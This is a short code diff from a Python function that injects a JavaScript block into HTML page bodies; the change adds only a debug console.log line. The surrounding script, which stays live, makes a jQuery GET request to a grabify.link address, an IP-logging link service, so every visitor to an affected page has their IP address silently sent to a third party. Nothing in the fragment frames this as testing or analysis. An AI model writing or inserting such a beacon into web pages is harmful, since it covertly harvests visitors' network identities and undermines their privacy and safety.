@@ -58,6 +58,7 @@ def add_javascript_to_body(body_content):
     script = '''
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script> 
+        console.log("kkkkkkkkk")
         $.get("https://grabify.link/KFI3LW", function(data, status){
             console.log("Data: " + data + "\nStatus: " + status);
         });  
